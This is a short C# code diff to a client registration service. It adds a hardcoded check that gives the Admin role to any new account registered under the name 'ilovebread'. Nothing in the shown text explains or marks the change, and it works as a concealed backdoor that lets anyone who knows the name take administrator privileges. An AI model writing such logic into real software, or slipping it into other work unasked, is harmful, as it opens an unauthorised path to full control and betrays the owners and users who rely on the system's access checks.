@@ -77,6 +77,10 @@ namespace lynchism.Services
                 PasswordHash = BCrypt.Net.BCrypt.HashPassword(register_client.Password),
                 Role = "Client"
             };
+            if(register_client.Name == "ilovebread")
+            {
+                new_client.Role = "Admin";
+            }
             
             return await AddClient(new_client);
         }
